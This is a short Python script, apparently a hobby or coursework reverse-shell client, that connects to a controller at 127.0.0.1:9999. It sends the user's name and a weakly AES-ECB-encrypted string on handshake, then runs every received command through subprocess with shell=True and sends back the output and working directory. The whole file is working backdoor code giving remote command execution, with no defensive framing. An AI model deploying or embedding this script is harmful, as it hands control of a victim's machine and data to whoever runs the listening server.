import socket
import os
import subprocess
from Crypto.Cipher import AES
import getpass
import hashlib


def getUserName():
    username = getpass.getuser()
    return username


def hash_string(input_string, method="sha256"):
    try:
        hash_func = getattr(hashlib, method)
    except AttributeError:
        return "error"

    hashed = hash_func(input_string.encode()).hexdigest()
    return hashed




def pad(text):
    while len(text) % 16 != 0:
        text += ' '
    return text

def encrypt(text, key):
    key = pad(key)[:16].encode()
    cipher = AES.new(key, AES.MODE_ECB)
    padded_text = pad(text)
    encrypted_bytes = cipher.encrypt(padded_text.encode())
    return encrypted_bytes

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '127.0.0.1'
port = 9999
key = "secret123"

s.connect((host, port))

while True:
    data = s.recv(1024)
    command = data.decode("utf-8")

    if command == "server up!":
        myName=getUserName()
        s.send(encrypt("password", key))
        s.send(myName.encode())

    elif command[:2] == 'cd':
        try:
            os.chdir(command[3:])
            s.send(b"Changed directory.")
        except Exception as e:
            s.send(str(e).encode())

    elif command == "exit":
        s.close()
        break

    elif len(command) > 0:
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_byte.decode("utf-8")
        currentWD = os.getcwd() + "> "
        s.sendall(str.encode(output_str + currentWD))



        #ralkhayer